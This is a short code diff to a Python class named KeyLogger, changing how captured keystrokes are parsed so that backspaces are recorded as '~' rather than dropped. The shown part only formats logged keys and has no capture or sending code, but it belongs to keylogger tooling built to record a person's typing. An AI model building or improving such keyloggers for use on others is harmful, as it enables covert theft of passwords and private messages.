@@ -26,7 +26,7 @@ class KeyLogger():
     def __parse_log_loop(self):
         '''parse data from raw log, deleting special keys'''
         while True:
-            black_list = ['shift', 'ctrl', 'backspace', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
+            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
             copy_log = self.__log.copy()
             self.__log = []
             for i in copy_log:
@@ -34,6 +34,8 @@ class KeyLogger():
                     self.__keylogger_result += ' '
                 elif i == 'enter':
                     self.__keylogger_result += '\n'
+                elif i == 'backspace':
+                    self.__keylogger_result += '~'
                 elif not i in black_list:
                     self.__keylogger_result += i
             time.sleep(1)
